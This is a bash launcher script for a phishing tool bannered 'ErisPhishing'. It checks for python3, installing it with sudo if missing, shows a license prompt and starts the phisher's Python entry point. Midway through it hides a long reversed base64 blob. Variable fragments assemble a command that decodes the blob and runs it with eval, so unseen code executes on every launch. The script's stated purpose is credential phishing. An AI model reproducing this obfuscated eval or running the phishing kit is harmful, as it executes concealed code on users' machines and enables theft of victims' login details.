#!/bin/bash

# Author       : k4itrun
# Github       : https://github.com/k4itrun
# Discord      : https://billoneta.xyz/k4itrun
# Email        : tsx@billoneta.xyz
# Date         : 11-10-2023

# If you don't know what you're doing, get out of here right now and use this with the instructions.

VERSION="1.0.0"
AUTHOR="\x6b\x34\x69\x74\x72\x75\x6e"
ERIS_PATH="src/launch.py"
CONFIG_FILE="assets/counter.txt"

GREEN="\e[32m"
LGREEN="\e[1;32m"
CYAN='\e[36m'
BWHITE="\e[1;37m"
YELLOW="\e[33m"
LYELLOW="\e[93m"
BLUE="\e[34m"
BBLUE="\e[94m"
RED="\e[31m"
BGGRAY="\e[48;5;235m"
RESET="\e[0m"

SUCCESS="${YELLOW}[${BWHITE}√${YELLOW}] ${GREEN}"
ERROR="${BLUE}[${BWHITE}!${BLUE}] ${RED}"
INFO="${YELLOW}[${BWHITE}+${YELLOW}] ${LYELLOW}"
INFO2="${GREEN}[${BWHITE}•${GREEN}] ${BGGRAY}"
ASK="${GREEN}[${BWHITE}?${GREEN}] ${BBLUE}"

show_banner() {
    echo -e "${LGREEN}      _____      _     ____  _     _     _               _               ${RESET}"
    echo -e "${GREEN}     | ____|_ __(_)___|  _ \| |__ (_)___| |__   ___ _ __(_)_ __   __ _   ${RESET}"
    echo -e "${LGREEN}     |  _| | '__| / __| |_) | '_ \| / __| '_ \ / _ \ '__| | '_ \ / _\` | ${RESET}"
    echo -e "${GREEN}     | |___| |  | \__ \  __/| | | | \__ \ | | |  __/ |  | | | | | (_| |  ${RESET}"
    echo -e "${LGREEN}     |_____|_|  |_|___/_|   |_| |_|_|___/_| |_|\___|_|  |_|_| |_|\__, |  ${RESET}"
    echo -e "${GREEN}                                ${RED}[${VERSION}]${GREEN}                            |___/  ${RESET}"
    echo -e "${LGREEN}                             ${RED}[By ${AUTHOR}]                                ${RESET}"
    echo
}

gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" 'icVUyRiMjhEJ4RScw4EJiACbhZXZKsTKiAnW4RSVkwEJXFlckoXOWRydkYGJwpFekYHJyMGSkIGJ3RyckQGJXFlckMGJ3RiMjhEJiACbhZXZoQSP4tjIi0Dcah3OiMHZFJSP4R1OiwHI2JSPitjIlJSP3tjIiJSP2tjIi0Tcw40OiYWZi0zYKtjIk1CIi0TV7IiZpJSPjhDU7IiNi0je5Y1Oi8mI9Q2OiUWYi0jZFN2OiMXYwJSPFN2a7IychJSPmtjIi0jMjh0OiMnI9oEeItjIyBCfgcyYygmdkFTOpl1V1UnWYlUeLN0anV2dvdWSDF0ZadlTvJWeBRnWTFUaKhEdNJVMKZkUVVTOJNUQnl0QBdGWxkjZYFDOnl0QBdWSDJkZJNUQnl0QCZGWxkjZJNkQml0QBdWSDJkZJNUQnl0QCZWSDF0ZJNUQnl0QBdWSDF0ZJNUQnhVeBdWSDF0ZJNUQnl0QBdWSDF0ZJNkU3U1aWRlUWJVOJd2bnl0QBdmWX50bilXQ0p1UBlmSIRHSVtmVGRlbwcWSDF0ZJh0dnhVM5YGWzgnZJZUOmtkR4AHWxkjZmNUQnhVeCNmZDJEOYFDOntkR4AHWxkjZmNkQ4gVM4cWSDJkZYFDOnhVeCZGW5hmZLZFOnhVM4cWSDJkZYlnQml0QBdmSIR3USZlTGZFSwk2QpF0ZJNkQsllMoZXSDFDbJNUSrVGM4hUVrZlRU5GMnl0QBdWSId3ZJZUO4kES3dmSxkjZmNUQ2lkR5YmZDJEOYl3anZ2QB5GW5J0YmNUQ2lkR5YmZDFkbYlnQjl0Q4cGW5J0YJNEZmh1M3dmZDFkbYlnQjl0Q4cGWxg3ZJh0dnpES0NlUW5kRWhEMpNUaBdWSDJEbZJDa2l0QxwWSDl0alBDZTJVVW9kZTF0ZJNUQnZ2QChDWxkjZmNkQ4k0QChTSGhnZYlnQjl0QCZGW5lDOJh0dnZ2QChTSGhnZYlnQjlES3dmZDJEOJNkQmhVe4cmZDF0ZmNkQ4kES3dmZDJEOJNEamZ2QChTSDF0alFjSGVFMWVlZTl0SJNUQnl0RWpWYHhzZMdVVnlUaSdDVFR2USVlVPZ2UBdWSDF0ZmZUOmhVM5YmZGlDOJNkQ4g1M4ZGWxgjdYNzdnl0QChDWzc3ZmZUO4g1M4ZGWxgjdYNzdnZmR5gDWGljZYNDemZ2QBdmZGlDOYNzdnZmR5gDWGljZMNkQ4k0QBtWZxokRVBjVVZ2UJtUSDF0ZJdkVqF2R4cGTXV1ZJlmU3IVMKZkUVVTOJNUQnl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQnl0QBtWZxokRShUMipES0dlUWpEVTVVOPZmVwsWZwQ2USVlVPZ2UBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQnl0QChDWxkjZMlXQnpES0NlUW5kRWhEMpNUaBdWSDJEbZJDa2l0QxwWSDl0alBDeIV1aWZEVuBzZJNUQnl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNkU3U1aWVkZWR3QlNVQrVGMGZlVFhGUV5WMkl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQnl0QBdWSDF0alFjSGVFMWVlZTl0SJNUQnl0RWpWYHhzSmF1bLlVbGVnYtZVeNRFMrtESO9mYzQmZZ1mR1JWbWl3SRBXaZdVN1pFWJlHUTF1bjJDa2RWM5kWWXVTdahVS5tUUvtUYXl1ZXFzcnlUaSlWWXVTdahVS4lUaBhGUTFUaKdkSoJWb1w2YqlUaJZUMk9UeCBTYHZVdDlWQnl0RWpWYHhzZMdVVnlUaSdjUWp0UUFjS5kkRCNnWXZkeaNlQrJmM04GZDJEMj52anR2R4cWWygGai1GZsl0RxUTSHpEai1WNsNWa3dmYtlzMJhEb2R2UCpnYygnMaNlQwR2QCNXYXRHbJhkUvFGWNZTSHRGckNkQqJ2R5UnWTJ0bkhkU3NmevZHTyQGckdEaxkVa1omYyAjdKhEdCZlVSlEVxoUOMBjV5FGWOFVYHxmehdkV5xUbkBHZDl0SJNUQnpFWoBHZDFEeD1mWwN0ZwpXYHlzMYJDewllMWV3YyU1bLNlQ3MUaBdWSDJkaZhVUnBFR3dWSrZFUSlWSLl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQnRVVsVVSFhHcZJjV1NmMVtUSDF0ZJNUQnl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQnl0QBdWSF5kdjhEb5F2Vk9GZDF0bZl3an1kaBlXTpJkcOdEbwMmbWV3Qn92ZJNUQnV1RWlnYXxmejJDb2JWaCB3Y5J0bahlSsllbrdmWzoEai5mUsp1Q3dmWupEbaNlQ2pVaCpWYHZUeaJTVzlESSZXSHZUdlNlQ3pFWKpnYyQzZiJjSwk1VsVXYXVjbJdURnllM5cXZR92ZJNUQnJmMZdGZHhGcjlnQ6JmMaBDZyYUeaNlQoJWbRdWWY5keiJjTwlFWSxmWDJ0aiJjTxI2VWVHZHZEMhdVO1l0RaBnYHZleJNEawE2RVdWSs5kda5mUzkFWKxWSpt2cJhkU2l0RSxWWXd3SJNUQnl0RsVXSIJ1baNlQUJmMaBDZyYUeaNlQzEGWS9mYzYFMJhkSsN2MSlXYX5EMhdVO1x0QCBnYt50ckdlUwJWbjdGZywGMhdUOxQ2QCNXYXFDckdkRwE2V5UXSIJ1baNlQ5F2Vk9GZI10SJNUQnlESSZXSIZleaN1dnllM5cXZTd3ZidVOrF2VaVDTDJEdahlSup1U3d2YIZVaidEb6F2Q3dmWHxmekhkSwllbWBjWTd3ZjNjVpJ2RspmWXVjeaN1dnl1V1sGTykTeJhkTsJ2R3tUSDF0ZJdkT2N2Rsx2Y5JkdalmQwE2RVdWVykTbkhEZoNWbVNXSHZUdaNkQwIWeCdnWYpEdhhVUnN2RWl3YykTdjlnQwIWeCNTYHlDdJhkUvp1UCRlYyoFMkJjR5p1UCB3Y392ZJNUQnplbWlnYtxmehdkVrlESSZXSHJldJhkT2x0QCpHZXpUcadlTwkESSZXSIJ1baNlQtJmM4NnYzQGci12YnllM5UnWHxGMhdVO1Nmevt0QpF0ZJNkQVF2RVdWWXpkdk1WVnllM5cXZYpEcaJDawk0R1YHZHxmaaNlQoJWbRdGZHhGcjlnQ3pFWKRXYY5kehdVO1l0R1YHZHxmaaNlQ6F2RGNnYDJUaaNlQwJWbONHZXJFbaNkQwJWaChmYHd3SJNUQnl0ROZ3YHxGbjlnQ2NWaCpHZXpkekdkR1R2RshmYDJ0diNjSwE2V5U3Y5JkdalmQwE2RVdWVykTbkhEZoNWbVV3Qn92ZJNUQnZVRoZUSG5EUSxmUYFlVKZUSFxGVJZkQTRVMapkUFZVRJNkSCVVeCpUV5l0cJZEZKZVRoBlVWF1ZWBjRTV1aG9kVGt2ZUBTWnFVV1oVSFRnSUtWUzlURWlVVGpkRVFTTnRVMJtUSDF0ZJVEbOVVR4pkUVF1cJVEbPFFM4ZlUFx2TSlnQDZlVRdGVrlTVJVEeKRVVsVlUVF1ZWVEOnZVRoZUSGRmQVxmSCRFbSpkUW10ZUBTWnRVVWNVUwgmQUxmUCF1as10UWJlWMF0bnl0QBdmUrxWVUtmVUVVeCdEVxk0ZRNlQRFlVKV1UV5kVUVkRTlkRCZVVsJEUVBTVnFVV1UUSFVDUUtGbPJFbKpEVrRmRUVlVPZ1Q0c2UVRzZUtGOnJlVaZEVsF1ZVBDaCRVR3dmVFhmRDlWQnl0QCJkVWJVSUFjSUlUR5MVSF5EUVZEbTNVVklkVDJUSUBDeFJlVKRVSFpkRJVEeKFVVK1kUTJ0RUFTSnFVV1oVSF5UTRVFbOx0QCVUUVFjQSBjVUlUR5MVSFlTVTVkVTNUaBdWSDJUTTVlRDNVV4pkVGt2cJZEZJJlVSlkUWl0ZTVFNnFVV0cWUV5UVTVVOPlUR5cUSF5EUUxmUTFVVOVFTDJUVUFjSVlUR5MVSFlTVTVkVTZFMsRlUTd3ZRZlSKVFMs9kU5J0RVtWOOxUQvdWSDF0ZUFjVVlUR5cUSFlzUJVEbPlUROBFVrVjRRFjUKRFM0cmVwwWVTNkQVNVRVdWVwkzRWZEZCV1aVdGVxk0ZWVEaGlkRWRlUTJEUVlmQQZVRoZUVpJURSVlRNNVV1gUV5JkSUlmQVNVRVtUSDF0ZJZkTQJFbShVUWpkRMd2bLJVV5c0QpF0ZJNkQsllMoZ3QuBzSD1Ge2l1VSBnYtN2bLNlQ3MUaBdWSDJ0ciJjToJ2QCpWYHZUejpHMpl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQpNUaBdWSDJ0ciJjToJ2QCNnWXVjbkd0Z5oESzpWWygGaj5mT5MUaBdWSDJ0ciJjToJ2QCNnYyY0ahdVNuB1UKJWSn92ZJNUQnJ2R5oWWXd3ZadkVzlFWrlTTDRzdOF1bLl0QBdWSHpldjlWQvt0RrdGUTF0dPlnQwlER3dmYHZVdaNjUv9UeCB3S5NHcLR1cnp1R4sUSDF0ZJNUQnl0QCNnYyY0ahdVNuB1UKJmSIRnahdkR5Nmevd3TpJFcmRFM5AVaSdTWygGaj5WT2o0RslDWTl0SJNUQnl0QBdWSDJEbZJDa2l0QxUnWTFUaKhEdaJVV41EVxQWOKhEdzJmMGtWYXVjbmNlU3U1aWRlUWJVOJd2bnl0QBdWSDF0ZJhkTzp1VWdXSDJ1aadFeoVWUvdWSDF0ZJNUQnl0RWpWYHhzZMdVNsl0QKN2Ypl0SJNUQnl0RSZnYtV1SJNUQnl0RWpWYHhzSmFVP9cCIi0zc7ISUsJSPxUkZ7IiI9cVUytjI0ISPMtjIoNmI9M2Oio3U4JSPw00a7ICZFJSP0g0Z' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp="";x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp");eval "$N0q$x$Hc2$rQW"

main() {
    clear

    if command -v python3 &>/dev/null; then
        show_banner

        COUNTER_L=0
        if [ -e "$CONFIG_FILE" ]; then
            COUNTER_L=$(cat "$CONFIG_FILE")
        fi

        if [ "$COUNTER_L" -lt 3 ]; then
            show_license

            ((COUNTER_L++))
            echo "$COUNTER_L" > "$CONFIG_FILE"
        fi

        echo -e "${SUCCESS} Clean code, starting phisher... ${RESET}"
        loading  
        loading  
        python3 "$ERIS_PATH"
        echo
    else
        echo -e "${ERROR} Python3 is not installed on this system. Installing... ${RESET}"

        if sudo apt-get update; then
            if sudo apt-get install -y python3; then
                echo -e "${SUCCESS} Python3 installed SUCCESSfully. Waiting 3 seconds before running $ERIS... ${RESET}"
                sleep 3
                python3 "$ERIS_PATH"
            else
                echo -e "${ERROR} Could not install Python3. Please install it manually and try again. ${RESET}"
            fi
        else
            echo -e "${INFO2} Failed to update repositories. Check your internet connection and try again. ${RESET}"
        fi
    fi
}

main
